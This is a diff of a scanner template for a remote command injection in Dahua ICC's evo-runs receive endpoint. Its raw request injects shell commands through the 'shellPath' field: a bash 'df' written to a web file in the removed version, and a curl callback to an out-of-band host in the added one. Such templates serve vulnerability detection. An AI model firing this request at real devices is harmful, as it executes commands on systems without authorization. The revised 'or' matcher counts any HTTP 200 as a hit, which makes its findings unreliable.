@@ -1,44 +1,71 @@
-id: dahua-icc-rce
+id: CVE-2025-XXXXX
 
 info:
   name: Dahua ICC evo-runsv1.0 RCE
   author: ProjectDiscoveryAI
   severity: critical
   description: |
-    This template detects potential remote code execution (RCE) vulnerability in Dahua ICC evo-runsv1.0 `/evo-runs/v1.0/receive` endpoint by sending a malicious payload.
-  tags: rce,dahua
+    Dahua ICC evo-runsv1.0 contains a remote code execution vulnerability in the /evo-runs/v1.0/receive endpoint
+    via the agent.ossm.mapping.config method that allows unauthenticated attackers to execute arbitrary system commands.
+  reference:
+    - https://www.dahuatech.com/security
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-XXXXX
+    - https://cwe.mitre.org/data/definitions/78.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-78
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: dahua
+    product: icc-evo-runsv1.0
+    fofa-query: app="Dahua-ICC"
+  tags: cve,cve2025,dahua,icc,rce,oast,blind
+
+variables:
+  oast: "{{interactsh-url}}"
 
 http:
   - raw:
       - |
         POST /evo-runs/v1.0/receive HTTP/1.1
         Host: {{Hostname}}
-        Accept-Encoding: gzip
-        Connection: keep-alive
-        Content-Length: 249
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+        Accept: application/json, text/plain, */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
         Content-Type: application/json
-        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36
-        X-Subject-Headerflag: ADAPT
+        Connection: close
 
         {
           "method": "agent.ossm.mapping.config",
           "info": {
-            "configure": "abcd",
-            "filePath": "haha",
+            "configure": "test",
+            "filePath": "test",
             "paramMap": {
-              "shellPath": "/bin/bash -c df>/opt/evoWpms/static/macvguun.txt",
-              "filePath": "abc"
+              "shellPath": "curl {{oast}}",
+              "filePath": "test"
             },
-            "requestIp": ""
+            "requestIp": "127.0.0.1"
           }
         }
 
-    matchers-condition: and
+    matchers-condition: or
     matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+
       - type: status
         status:
           - 200
-      - type: word
-        words:
-          - "macvguun.txt"
-        part: body
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - "(curl.*)"
